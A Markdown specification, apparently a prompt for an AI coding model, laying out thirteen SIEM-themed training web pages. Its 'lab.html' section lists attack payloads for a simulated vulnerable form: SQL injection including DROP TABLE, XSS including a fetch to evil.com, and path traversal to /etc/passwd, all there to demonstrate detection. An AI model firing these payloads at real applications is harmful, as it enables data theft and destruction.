# Rebuild instructions — Meridian-7 experience pages

**Model:** claude-opus-4-7  
**Rule:** Every file must be a complete, shippable implementation. No placeholders. No TODOs. No stubs. No skeleton code. Every interactive element must actually work. Minimum 600 lines per file. If a feature is listed, it must be in the output.

---

## Design system — apply to every page

**Backgrounds:** `#020617` (deep navy), `#0a0618` (deep violet), `#0a0408` (deep crimson), `#030a04` (phosphor black)  
**Accent palette:** `#38bdf8` blue · `#39ff14` phosphor green · `#6366f1` indigo · `#c4b5fd` violet · `#fbbf24` amber · `#f87171` red · `#34d399` emerald  
**Typography:** `"IBM Plex Mono", Consolas, monospace` everywhere. Never system-ui or sans-serif except where explicitly noted.  
**Borders:** Always `rgba`-based. Thin `1px`. Never solid white or black.  
**Glows:** Use `box-shadow: 0 0 Xpx COLOR` for active states. Pulse animations on critical indicators.  
**CRT / scanline overlay** on terminal-family pages: `repeating-linear-gradient` over the body, pointer-events none.  
**Transitions:** All interactive state changes animated. Minimum 200ms. Prefer `ease` or `cubic-bezier(0.4,0,0.2,1)`.  
**No lorem ipsum.** Every text string must be plausible SOC/security content.  
**No `alert()`, `console.log()` left in production code.**

**Shared assets that must be loaded on every page (in this order):**
```html
<script src="assets/siem-core.js"></script>
<script src="assets/palette.js"></script>
<!-- page-specific scripts -->
<script src="assets/deck-nav.js?v=15.2.0-exp-nav"></script>
```
Also load `assets/palette.css` and `assets/deck-nav.css` in `<head>`.

**SiemCore calls every page must make:**
```js
SiemCore.bootPage('PAGEID');
SiemCore.AchievementSystem.check('visit_PAGEID');
```

**The `<div id="deck-nav-root"></div>` element must be present before `deck-nav.js`.**

---

## Page 1 — terminal.html

**Page ID:** `terminal`  
**Libraries:** xterm@5.3.0, xterm-addon-fit@0.8.0, xterm-addon-web-links@0.9.0  
**Constructor fix (critical):** `new FitAddon.FitAddon()` and `new WebLinksAddon.WebLinksAddon()`

**What it is:** A fully functional in-browser SOC analyst shell. The user types real commands and gets real-feeling responses. It is not a toy. It should feel indistinguishable from a real terminal session on a SIEM appliance.

**Commands that must work:**
- `ls`, `ls -l`, `ls -la` — with color-coded output (dirs cyan, files white, hidden files grey)
- `cd PATH`, `pwd`
- `cat FILE` — full file content with line numbers for long files. Files include: `/var/log/siem/alerts.log`, `/etc/motd`, `/etc/passwd`, `/opt/siem/config.json`, `/home/analyst/notes.txt`, `/home/analyst/.bash_history`, `/proc/1/cmdline`, `/proc/42/cmdline`
- `grep PATTERN FILE` — must highlight matched pattern in yellow within matching lines
- `grep -r PATTERN /path` — recursive grep stub that returns plausible results
- `tail -f FILE` — real streaming mode with new events every 2 seconds. Ctrl+C stops it. Must show a pulsing `[live]` indicator.
- `tail -n N FILE` — last N lines
- `head -n N FILE` — first N lines
- `wc -l FILE` — line count
- `history` — numbered history, arrow up/down navigates history in the input
- `whoami`, `hostname`, `uname -a`, `uptime`, `date`
- `ps aux` — table output with PID, CPU%, MEM%, CMD columns
- `top` — ASCII table that refreshes once, shows ingestd, rules-engine, bash
- `netstat -an` — simulated open ports: 514 LISTEN, 5601 LISTEN, 9200 LISTEN, 6379 LISTEN
- `curl URL` — returns `{"status":"ok","station":"meridian-7"}` for internal URLs, a fake 403 for external
- `ssh USER@HOST` — shows banner then a secondary prompt `$` that accepts `exit` or `logout` to return
- `nmap TARGET` — port scan output with 5 open ports, service names, version guesses
- `python3 -c "EXPR"` — evaluates simple arithmetic expressions. `python3` alone opens a `>>>` REPL stub with `exit()` support.
- `sudo COMMAND` — password prompt (hidden input), accepts `meridian` or `habibi`, grants elevation for the session
- `jq . /opt/siem/config.json` — pretty-printed JSON output
- `find / -name "*.log"` — returns a list of 8 log file paths
- `chmod`, `chown` — "operation recorded in audit log" acknowledgement
- `man TOPIC` — returns formatted manual pages for: `grep`, `tail`, `siem`, `habibi`, `nmap`, `ssh`
- `fortune` — random SOC proverb
- `clear` — clears terminal
- `echo TEXT` — prints text. `echo $SIEM_SECRET` triggers the easter egg: `ACCESS GRANTED — SIEM_SECRET=meridian-seven-observation-deck`
- `rm -rf /` — `rm: it is too late. The logs have already seen you.`
- `history payload` — easter egg: `[!] Historical payload fragment recovered: M7-HIST-0xDEADBEEF`
- `alias` — shows 4 pre-set aliases: `ll='ls -la'`, `alerts='tail -f /var/log/siem/alerts.log'`, `crit='grep CRIT /var/log/siem/alerts.log'`, `status='cat /opt/siem/config.json'`
- Tab completion: hitting Tab autocompletes filenames in the current directory and known commands.
- Arrow up/down: navigate command history.
- Ctrl+L: clear screen.
- Ctrl+C: interrupt current operation (especially `tail -f`).

**UI details:**
- Phosphor green (`#39ff14`) text on near-black (`#030a04`) background.
- CRT scanline overlay via CSS `body::after` with `repeating-linear-gradient`.
- Chromatic aberration text shadow on the xterm element: `1px 0 rgba(255,0,80,0.08), -1px 0 rgba(0,180,255,0.08)`.
- Fixed header bar: pulsing green LED, hostname, version, live UTC clock.
- Boot sequence: progress bar fills over ~1.5s, then the terminal appears with the MOTD.
- The MOTD reads:
  ```
  ╔══════════════════════════════════════════════════╗
  ║  MERIDIAN-7 SIEM · ANALYST TERMINAL v15.2        ║
  ║  Authorized personnel only. All actions logged.  ║
  ╚══════════════════════════════════════════════════╝
  Last login: Today from 10.0.4.12
  847 active rules · 3 critical alerts · ingest: online
  ```

---

## Page 2 — breach.html

**Page ID:** `breach`  
**Libraries:** Tone.js, GSAP, matter-js (for physics if needed, otherwise just canvas)

**What it is:** A playable SOC incident response game. The player is an analyst. A red team is compromising nodes in real time. You must triage, isolate, and contain before the attacker reaches the crown jewel node.

**Full game loop:**
- 5 scenarios with distinct topologies and attacker strategies (Phishing Drop, Lateral Move, Ransomware, Data Exfil, Supply Chain)
- Each scenario has a 120-second timer. If the crown jewel is compromised or time runs out: BREACH FAILED.
- Nodes are drawn as labeled circles on a force-directed canvas layout. Node types: WORKSTATION (blue), SERVER (indigo), FIREWALL (amber), DMZ (orange), CROWN (gold with glow — this is what you're protecting)
- Zones drawn as semi-transparent background rectangles: DMZ (red tint), INTERNAL (blue tint), OT (green tint)
- Edges drawn as lines between nodes. Compromised edges pulse red.

**Player actions:**
- **Click node** — selects it, shows detail panel with node name, IP, zone, compromise status, connection count
- **Isolate Node** — removes all edges from selected node. Costs 1 action token. Confirms with a flash animation on the node turning grey.
- **Deploy IDS** — places a sensor on a selected edge. Any traversal of that edge alerts with a yellow flash and stops propagation. Costs 1 action token.
- **Flush Sessions** — clears all active traffic on compromised nodes (resets compromise on 3 random non-crown nodes). Costs 1 action token.
- **Block IP** — blacklists the attacker IP shown in the event log. Pauses attacker movement for 15 seconds.
- Action tokens regenerate: 1 per 8 seconds, max 5.

**Attacker AI:**
- Starts at a random perimeter node.
- Every 3 seconds attempts to traverse to an adjacent uncompromised, non-isolated node.
- Prioritizes nodes closer to the CROWN.
- After compromising 3 nodes, spawns a second attack thread from a different perimeter node.

**UI elements:**
- Top HUD: timer countdown (red when < 30s), action token pips, scenario name, score
- Right panel: live event log showing attacker moves as they happen (`[03:14] LATERAL MOVE: workstation-04 → server-02`)
- Bottom panel: action buttons, selected node details
- On BREACH FAILED: full-screen dark overlay, red text "BREACH: CROWN JEWEL COMPROMISED", score, replay button
- On WIN: green overlay, "CONTAINMENT ACHIEVED", final score, share button (calls `SiemCore.SessionState` or `window.SiemShareCard` if available)

**Audio:** All Tone.js audio behind user gesture (first button click). Breach alert: sharp sine burst. Isolation: low thump. Win: ascending arpeggio.

---

## Page 3 — network.html

**Page ID:** `network`  
**Libraries:** D3.js v7, Three.js (for starfield), Tone.js

**What it is:** A procedural, living network graph of 45 nodes. Threats propagate in real time. The user watches, investigates, and can interact with nodes.

**Network:**
- 45 nodes, types: server (square icon drawn in canvas), workstation (circle), router (diamond), firewall (hexagon), sensor (triangle). Each type has a distinct color.
- 60+ edges, procedurally connected on load.
- Threat propagation: every 4 seconds, 1 random compromised node attempts to spread to an adjacent node. Starts with 1 compromised node (always a perimeter workstation).
- Packet animation: small dots travel along edges continuously. Color: blue for normal, red for threat traffic.
- Node click: opens right-side drawer with full node detail — name, IP, type, zone, threat status, connected nodes list, last 5 events from that node.
- Node hover: shows tooltip with name and IP.
- Zoom and pan via D3 zoom behavior.
- Legend at bottom-left showing node type icons and colors.

**Controls (in header):**
- **Isolate** — isolates the selected node (removes from propagation graph, greys it out)
- **Reset** — resets the entire network to clean state
- **Speed** — toggle propagation speed: Slow / Normal / Fast
- **Ambient Audio** — toggles Tone.js oscillator drone (must use `Tone.start()` in click handler)

**Packet capture modal:**
- Triggered by "Capture Packets" button in drawer.
- Shows last 15 captured packets in Wireshark-style format:
  ```
  No.  Time         Source           Destination      Protocol  Length  Info
  1    00:00:01.234 10.0.4.12        192.168.1.44     TCP       1460    SYN
  ```
- Each row has a subtle background color by protocol (TCP: blue, UDP: green, ICMP: yellow, DNS: purple)

**Event log strip** at bottom of screen: scrolling horizontal ticker of events, like `[03:12:44] ALERT src=10.0.4.12 rule=brute-force sev=HIGH`. New events push in from the right.

**Starfield** on a canvas layer behind the SVG: 150 stars, slow parallax drift when mouse moves.

---

## Page 4 — cipher.html

**Page ID:** `cipher`  
**Libraries:** GSAP + TextPlugin, Howler.js

**What it is:** A six-chamber cryptographic vault. Each chamber has a cipher puzzle. Solving unlocks a classified SIEM detection brief. All six completed unlocks a final OMEGA access key.

**Chambers and their actual puzzles (all answers must work):**

**ALPHA — Caesar shift:**  
Ciphertext shown: `PHULGLDA` (shift +3 of MERIDIAN)  
Answer: `MERIDIAN`  
On solve: vault door animation (CSS transform scaleX from 1 to 0.05 then UNLOCKED text appears inside)

**BETA — Reverse string:**  
Shown: `NAIDIREM` (MERIDIAN reversed)  
Answer: `MERIDIAN`  
On solve: text scramble animation with GSAP TextPlugin

**GAMMA — Vigenère cipher:**  
Key shown: `KEY`  
Ciphertext: `VEQPGMER` (encrypt DETECTION with key KEY)  
Answer: `DETECTION`  
On solve: morse code animation in the status bar

**DELTA — Base64:**  
Shown: `TUVSSURJQU4=` (base64 of MERIDIAN)  
Answer: `MERIDIAN`  
On solve: binary rain on the chamber card (falling 0s and 1s via canvas overlay)

**EPSILON — ROT13:**  
Shown: `ZREVQVNA` (ROT13 of MERIDIAN)  
Answer: `MERIDIAN`  
On solve: hex dump animation in the status bar

**ZETA — Combine all keys:**  
Instruction: "The vault key is: first-chamber-answer + hyphen + last-four-digits-of-DELTA-base64"  
Answer: `MERIDIAN-IAN=` — actually, make this solvable: show the instruction "Enter: [ALPHA answer]-VAULT-7" and accept `MERIDIAN-VAULT-7`  
On solve: full vault UNLOCKED sequence — all chambers glow, particle burst effect, the OMEGA brief slides in from bottom

**Visual design for each chamber:**
- Card with gradient border that glows when solved (green glow)
- Input field with monospace font, placeholder showing the encoded string
- Solve button that pulses on hover
- Status area below the button: shows "LOCKED", then "INCORRECT — try again" on wrong answer, then "UNLOCKED ████" on correct
- Each card has a subtle background pattern (grid lines, circuit trace, etc.) unique per chamber

**After all 6 solved:** A classified intelligence brief slides in at the bottom:
```
CLASSIFIED — MERIDIAN-7 THREAT INTELLIGENCE BRIEF
IOC SUMMARY: C2 domain c2.meridian-shadow.net · 203.0.113.8 · SHA256: a3f2...
DETECTION RULE DEPLOYED: rule=apt-lateral-move threshold=3 window=5m
STATUS: CONTAINED
```

---

## Page 5 — sim.html

**Page ID:** `sim`  
**Libraries:** GSAP + MotionPathPlugin, D3.js, Tone.js

**What it is:** A cinematic MITRE ATT&CK kill chain reconstruction engine. Six missions. Each mission plays as an animated timeline where the attacker moves through the kill chain while SIEM detection rules fire to intercept them.

**Use a paused GSAP tween for actor movement (already fixed):**
```js
var motionTween = gsap.to(actor, {
  motionPath: {path: pathData, alignOrigin:[0.5,0.5], autoRotate:false},
  duration: 1, paused: true, ease: 'none'
});
// In runAnim: motionTween.progress(t/100)
```

**Six missions with distinct narratives:**
1. **Initial Access** — Phishing email → credential harvest → first foothold
2. **Persistence** — Registry key → scheduled task → WMI subscription  
3. **Lateral Movement** — Pass-the-hash → SMB spread → admin share access
4. **Exfiltration** — Staging → compression → DNS tunnel exfil
5. **Impact** — Ransomware deployment → backup deletion → encryption
6. **Recovery** — Isolation → wipe → restore from clean backup

**Per-mission anatomy:**
- The stage shows a SVG path from left (attacker) to right (target crown jewel)
- 5–7 phase nodes along the path, rendered as labeled circles
- Attacker icon (amber dot with glow) moves along the path as you scrub/play
- When the actor reaches a phase node: that node lights up, the narrator updates, and a SIEM rule fires on the right panel
- SIEM rule intercept panel: shows the rule that caught this phase, formatted as:
  ```
  RULE FIRED: brute-force-login
  Threshold: 5 failures / 60s
  Source: 10.0.4.12
  Action: ALERT HIGH
  ```
- Each intercept animates in with a slide-up + glow effect

**Timeline scrubber:**
- Range input below the stage (0–100)
- Play/Pause button
- Speed selector: 0.5x / 1x / 2x
- T+Xs label updates with simulated elapsed time

**Phase timeline strip** above the scrubber: shows all phase names in a row, the current phase highlighted in amber, completed phases in green, future phases in grey.

**Narration box:** Full-width paragraph below the stage updating per phase with realistic SOC narrative text. Example: "The attacker exfiltrated 2.3 GB via DNS tunneling to 198.51.100.44. The SIEM's DNS tunnel rule fired after detecting 847 TXT record queries in under 4 minutes."

---

## Page 6 — intercept.html

**Page ID:** `intercept`  
**Libraries:** Typed.js, Howler.js, GSAP

**What it is:** An intercepted attacker C2 communications interface. The analyst reads captured session transcripts and attempts to decrypt encrypted segments to extract IOCs.

**Sessions (minimum 6):**
- SESSION-ALPHA through SESSION-OMEGA plus a bonus CLASSIFIED session
- Each session has 5–8 lines of dialogue/transcript
- Some lines are `[ENCRYPTED — decrypt to read]` in grey, revealed when the correct session key is entered
- The OMEGA session is locked until all others are decrypted

**Transcript content quality:**
Each session tells a piece of a cohesive story — the same breach from multiple angles. Sessions should reference the same IPs, domains, timestamps so it feels like a real investigation.

**Right panel — IOC Extractor:**
As the analyst reads sessions, IOCs (IPs, domains, hashes, filenames) are detected in the transcript text and automatically listed in a running IOC panel on the right. Click an IOC to mark it as "Confirmed", "False Positive", or "Investigating". Marked IOCs persist for the session.

**Decrypt interaction:**
- Enter session key in the bottom bar → matching lines animate from grey scrambled text to clear text (GSAP TextPlugin scramble effect)
- Wrong key: input shakes (CSS animation), red flash

**Classified brief (OMEGA):**
When OMEGA is unlocked (key: `omega-master`), a full intelligence brief slides in: attacker group attribution, TTPs, recommended SIEM rule changes.

**Visual details:**
- Left sidebar: session list with status indicators (locked padlock, partial lock, open lock)
- Main area: transcript styled like an intelligence report — serif font, generous line-height, classified stamps on encrypted lines
- Typing sound on each Typed.js animation (Howler short click sound from inline base64 WAV)

---

## Page 7 — forge.html

**Page ID:** `forge`  
**Libraries:** interact.js, D3.js, Fuse.js, Monaco Editor

**What it is:** A visual drag-and-drop detection rule builder. The user drags components from a library onto a canvas, connects them with edges, configures properties, and exports a YAML/JSON rule.

**Component library (left panel) — all draggable:**
- Triggers: Failed Login, Successful Login After Failures, New Process, Network Connection, File Write, Registry Change, DNS Query, Beaconing Pattern
- Filters: src_ip, dst_port, user_agent, hostname, severity threshold, time window, geolocation, protocol
- Enrichments: GeoIP, Threat Intel, UEBA score, Asset criticality
- Actions: Alert LOW / MED / HIGH / CRIT, Create Case, Block IP, Notify SOC, Suppress

**Canvas behavior:**
- Drag a component from library → drops as a node on the canvas at cursor position
- Click a node → selects it, shows configuration panel on the right
- Click and drag between two nodes' connection ports (small circles on node edges) → draws a connecting arrow
- Delete selected node: Delete key
- Canvas pan: middle-click drag or space+drag
- Canvas zoom: scroll wheel

**Configuration panel (right):**
- Shows fields for the selected node type: Trigger shows "event type", "source", "time window"; Filter shows "field", "operator", "value"; Action shows "severity", "message template"
- All fields are editable inputs that update the Monaco editor in real time

**Monaco editor (bottom right):**
- Shows live YAML representation of the current rule as it's built
- Syntax highlighting, read-only mode
- Updates on every canvas change

**Live test panel:**
- Below the canvas: a "Test Rule" button
- Sends the current rule against 5 sample log events (displayed in a mini table)
- Shows which events would trigger the rule (green checkmark) vs. pass (grey dash)

**Export:**
- "Export JSON" and "Export YAML" buttons
- Copies to clipboard, shows a toast notification

---

## Page 8 — archive.html

**Page ID:** `archive`  
**Libraries:** Three.js, Lenis

**What it is:** A 3D library. The user navigates a dimly lit corridor of filing cabinets and clicks drawer handles to open classified incident reports.

**Scene:**
- 8 filing cabinets arranged in two rows of 4 facing each other (a corridor)
- Each cabinet is 1.2w × 2h × 0.6d, color `#1e1b4b` (dark indigo), handle `#c4b5fd`
- Cabinets have 3 visible drawers each, with thin gap lines
- Floor: dark grid texture using PlaneGeometry with a custom material or a grid-helper
- Ceiling lights: 4 RectAreaLight or SpotLight fixtures with subtle volumetric look (additive planes)
- Fog: `scene.fog = new THREE.Fog(0x0a0618, 8, 25)` for depth

**Navigation:**
- WASD / arrow keys: walk forward/back/strafe
- Mouse look: right-click drag to look around
- Camera stays at eye height (y=1.6), clamped within the corridor
- Cursor crosshair at center of screen

**Interaction:**
- Raycasting on every click against cabinet drawer meshes
- Each drawer has `userData.docId` (0–23)
- Click a drawer: it slides open (GSAP tween translateZ 0 → 0.3 over 400ms), then the document overlay appears

**24 documents across the cabinets.** Each document has:
- Classification stamp (CONFIDENTIAL / SECRET / TOP SECRET)
- Incident ID and date
- 2–3 paragraph narrative summary
- Key findings and recommendations
- SIEM rule that was deployed as a result

Example documents: supply chain compromise 2019, ransomware pivot 2020, cloud misconfiguration 2021, insider exfil 2022, API key harvest 2023, zero-day 2024, nation-state APT, credential stuffing campaign, BGP hijack, DNS cache poisoning, watering hole attack, physical USB drop, spear phishing exec, OAuth token theft, container escape, Kubernetes cluster compromise, etc.

**Document overlay:**
- Lenis smooth scroll on the document panel
- Close button (Esc or × button)
- When closed: drawer slides back closed

---

## Page 9 — heist.html

**Page ID:** `heist`  
**Libraries:** Kaboom.js v3000

**What it is:** A playable 2D stealth game from the attacker's perspective. The player IS the threat actor. Navigate a top-down facility, avoid guard patrols, reach the server room, extract the data.

**Game structure — 3 levels:**

**Level 1 — Office Floor:**
- Layout: corridors and open-plan rooms
- 2 guards with simple patrol paths (back and forth)
- Player must reach the server closet without entering a guard's cone of vision
- Objective: plant USB stick (interact key E near server)

**Level 2 — Data Centre:**
- Layout: raised floor tiles, server racks as obstacles
- 3 guards, one with a random patrol (uses a waypoint system)
- Cameras: fixed cones of vision sweeping an arc. Touch = caught.
- Noise mechanic: running (Shift) makes noise that attracts nearest guard
- Objective: access the backup server console (E near terminal)

**Level 3 — Network Operations Centre:**
- Layout: open floor, multiple analysts at desks (they are civilians, not enemies, but walking into their line of sight raises suspicion meter)
- 4 guards + suspicion meter
- SIEM alert panel visible on the wall (decorative, updates as player progresses)
- Objective: plug into the core switch (E near switch cabinet)

**Mechanics:**
- Vision cones drawn as semi-transparent triangles
- If player enters a vision cone: 1.5 second detection countdown, move out to cancel
- If fully detected: caught animation, level resets
- Noise radius shown as brief circle around player when running
- Player movement: WASD or arrows
- E key: interact with objectives when in range
- Crouch (Ctrl or C): slower movement, smaller noise radius, lower profile (below desk-height cameras)

**HUD:**
- Suspicion meter (0–100%) in top-right
- Objective text top-center
- "SIEM ALERT" flashes when SIEM would have caught the action (teaching moment)

**Win/lose screens:**
- Caught: dark overlay, red "DETECTED BY MERIDIAN-7 SIEM", description of which rule caught you, Retry button
- Win: green overlay, score (time taken, detection-free streak), share button

---

## Page 10 — cartography.html

**Page ID:** `cartography`  
**Libraries:** Three.js, Globe.gl

**What it is:** A rotating 3D globe showing live threat arc visualizations. The user filters by threat actor, tactic, and severity. Click any arc to see the attribution and SIEM data.

**Globe setup:**
- `globeImageUrl`: use `https://unpkg.com/three-globe/example/img/earth-dark.jpg`
- `atmosphereColor`: `#38bdf8`
- `atmosphereAltitude`: 0.15
- Auto-rotate enabled, speed 0.3
- Globe background: starfield (set via `backgroundImageUrl` or manual Three.js scene)

**Arc data — at least 20 arcs:**
Each arc has: `startLat`, `startLng`, `endLat`, `endLng`, `color`, `country`, `layer`, `actor`, `tactic`, `severity`, `count`  
Distribute across all 7 layers: Alerts, Botnets, APT, Scanning, Tor Exit, C2, Exfil  
Cover regions: US, UK, Russia, China, Iran, North Korea, France, Germany, Brazil, Singapore, Australia, India, Ukraine, Israel

**Layer checkboxes (left panel):**
Must actually filter: `arcs.filter(function(a){ return layerState[a.layer] !== false; })`

**Arc click → detail panel (right):**
Shows: actor name (APT28, Lazarus Group, etc.), tactic (Initial Access, Exfiltration, etc.), severity badge (CRIT/HIGH/MED/LOW with color), count of events, source → destination country, recommended rule.

**Threat actor filter dropdown:** Filter by named threat actor (APT28, APT41, Lazarus, Sandworm, FIN7 — each has 2–4 arcs)

**Severity filter:** CRIT only / HIGH+ / All

**Stats strip (bottom):** Total arcs visible, highest severity, most active source region — updates live when filters change.

**Country labels:** When hovering the globe over a country that has active arcs, show a floating label with country name and arc count.

---

## Page 11 — lab.html

**Page ID:** `lab`  
**Libraries:** Chart.js, xterm@5.3.0, xterm-addon-fit@0.8.0  
**Constructor fix:** `new FitAddon.FitAddon()`

**What it is:** A payload injection sandbox. The user fires real attack patterns at a simulated vulnerable web app and watches the SIEM detect them in real time on the right-side terminal.

**Left side — Vulnerable App Panel:**
- A mock web form with three tabs: Login, Search, File Upload
- **Login tab:** username + password fields. Injecting SQLi payloads (`' OR 1=1--`, etc.) into username triggers detection
- **Search tab:** search input. XSS payloads (`<script>`, `<img onerror>`), SQL payloads, path traversal (`../../../etc/passwd`) all trigger distinct rules
- **File Upload tab:** filename input + fake upload button. EICAR-like filenames, `.php` extensions, double extensions (`.jpg.php`) trigger malware detection rule

**Left sidebar — Payload library (at least 12 payloads):**
Each payload is clickable and auto-fills the current tab's active input:
- `' OR 1=1--` (SQLi)
- `'; DROP TABLE users;--` (SQLi destructive)
- `<script>document.cookie</script>` (XSS stored)
- `<img src=x onerror=alert(1)>` (XSS reflected)
- `../../../etc/passwd` (path traversal)
- `%2F%2F%2F` (encoded traversal)
- `sleep(5)--` (blind SQLi)
- `\x00\x1a` (null byte injection)
- `../../../windows/win.ini` (Windows path traversal)
- `<svg/onload=fetch('//evil.com')>` (XSS exfil)
- `test.jpg.php` (double extension)
- `EICAR-STANDARD-ANTIVIRUS-TEST-FILE` (AV test string)

**Right side — SIEM Monitor (xterm):**
- When a payload is sent: terminal prints a SIEM alert entry:
  ```
  [03:12:44] ALERT rule=sql-injection sev=HIGH src=lab-user
    payload=' OR 1=1--
    action=BLOCKED confidence=0.97
  ```
- The rule name, severity, and action vary by payload type
- After 3 hits from the same payload type: a correlation alert fires:
  ```
  [03:12:49] CORRELATED rule=repeated-sqli count=3 window=30s
    action=BLOCK_IP src=lab-user
  ```
- Heartbeat line every 10s: `[HB] ingest pipeline ok · 847 rules active`

**Chart.js bar chart:** Shows alert count by rule type (SQLi, XSS, Path Traversal, Other) updating live as payloads fire. Bars in the accent palette colors.

**Score / tutorial overlay:** On first load, a subtle overlay shows "Fire a payload to begin detection monitoring." It dismisses on first payload.

---

## Page 12 — memorial.html

**Page ID:** `memorial`  
**Libraries:** GSAP + ScrollTrigger, Lenis

**What it is:** Six famous breach narratives as a long-scroll cinematic experience. Each section is a full-viewport chapter. Sections animate in on scroll. A progress bar tracks position.

**Six breaches (full content, not stubs):**

Each breach chapter must include:
- Year badge (monospace, letter-spaced, top of section)
- Headline (large, `clamp(28px, 5vw, 52px)`, colored in theme color for that breach)
- 3–4 paragraph narrative (minimum 180 words per breach) covering: what happened, how it went undetected, what the SIEM missed or caught, the lesson
- A pull quote styled distinctly (`font-style: italic`, left border `4px solid ACCENT`)
- A "SIEM DETECTION ANALYSIS" block: monospace, dark background, showing which rules would have caught it and why they didn't (or did)
- A tags strip: MITRE ATT&CK techniques relevant to this breach, styled as small chips

**Chapters:**
1. **The Supply Chain Night (2019)** — SolarWinds-style attack, trusted update package, 72-hour blind spot. Theme: deep red.
2. **The Ransomware Pivot (2020)** — Macro payload, decoy alert flood, DNS tunnel exfil. Theme: amber.
3. **The Cloud Misconfiguration (2021)** — S3 bucket public typo, 11 days undetected, rule scoped to on-prem only. Theme: indigo.
4. **The Insider Exfiltration (2022)** — Trusted credentials, anomaly was volume not behavior, the importance of baselines. Theme: violet.
5. **The API Key Harvest (2023)** — Rotated keys in 4 places, rate limit as detection trigger, 12-hour lag. Theme: emerald.
6. **The Zero-Day (2024)** — No signature, no IOC, lateral movement at machine speed, isolated by playbooks. Theme: blue.

**Scroll mechanics:**
- Lenis smooth scroll with `smoothWheel: true`
- Progress bar at top of page driven by `lenis.on('scroll', ...)` — `progress` property
- Each `.chapter-inner` element: `gsap.from({opacity:0, y:60})` with ScrollTrigger `start:'top 75%'`
- Pull quotes: `gsap.from({x:-40, opacity:0})` with stagger
- SIEM analysis blocks: `gsap.from({opacity:0, scale:0.97})`

---

## Page 13 — resonance.html

**Page ID:** `resonance`  
**Libraries:** Tone.js, Three.js

**What it is:** A six-channel audio mixer where each channel represents a SIEM detection layer. The user adjusts volume faders, tunes oscillator parameters, and watches a live 3D waveform react to the mix.

**Audio system:**
All audio starts on "Enable Audio" button click (calls `Tone.start()` — never before user gesture).

**Six channels, each with distinct sound character:**
1. **Alerts** — sine wave, 220 Hz, slow pulse (0.3Hz LFO on volume). Represents alert firing.
2. **Ingest** — triangle wave, 330 Hz, steady drone. Represents log pipeline.
3. **Rules** — square wave, 165 Hz, slight reverb. Represents rule engine evaluation.
4. **Network** — sawtooth, 110 Hz, low rumble. Represents network sensor feed.
5. **Threat Intel** — sine wave, 440 Hz, rapid staccato (16th note pattern). Represents IOC matches.
6. **Ambient** — filtered noise (Tone.js `Noise` with `Tone.Filter` at 400Hz), very low volume. Background atmosphere.

**Per-channel controls (fader strip):**
- Label with SIEM concept name
- Volume fader (range: -40 to 0 dB)
- Mute button (toggles channel on/off)
- Solo button (only this channel plays)
- Waveform selector: sine / triangle / square / sawtooth (except channel 6 which is noise)
- LED indicator: pulses at the rate of the channel's trigger pattern (so Threat Intel pulses fast, Alerts pulses slow)

**Three.js 3D waveform:**
- Full-width at the bottom, 160px tall
- An actual animated waveform that responds to the master output level
- Use a Tone.js `Analyser` node connected to the master `Destination`
- Pull analyser data each frame, update the Three.js `BufferGeometry` line's Y positions
- Waveform color follows the dominant channel (most volume): blue for Alerts, amber for Ingest, etc.

**Master controls:**
- Master volume knob (styled circular range input or a canvas-drawn knob)
- BPM control: 60–180, affects the tempo of rhythmic channels (Alerts pulse rate, Threat Intel staccato)
- Record button: captures a 5-second snapshot description (text), shown in a log strip below

**Visual design:**
- 6-column grid for fader strips
- Each strip has a background glow matching its channel color, intensity driven by volume level
- Strip background darkens when muted

---

## General rules that apply to every single file

1. **Every file loads the shared assets correctly** (siem-core.js, palette.js, deck-nav.js, palette.css, deck-nav.css)
2. **Every file calls `SiemCore.bootPage` and `SiemCore.AchievementSystem.check`**
3. **`<div id="deck-nav-root"></div>` present before `deck-nav.js` script tag**
4. **No `var something = undefined` — initialize properly**
5. **All event listeners for audio must be inside user gesture handlers**
6. **All xterm FitAddon: `new FitAddon.FitAddon()`**
7. **All xterm WebLinksAddon: `new WebLinksAddon.WebLinksAddon()`**
8. **Canvas elements must have a resize handler** that updates `canvas.width = canvas.clientWidth` etc.
9. **All CDN URLs must be https:// — no protocol-relative `//cdn...` URLs**
10. **Minimum 600 lines.** Count them. If you are under 600, you have not implemented enough.
11. **Do not produce a skeleton and say "add your content here"** — write the actual content
12. **Do not add HTML comments explaining what the code does** — the code explains itself
13. **Test every interactive element mentally before outputting** — if a button has an `onclick` it must do something meaningful
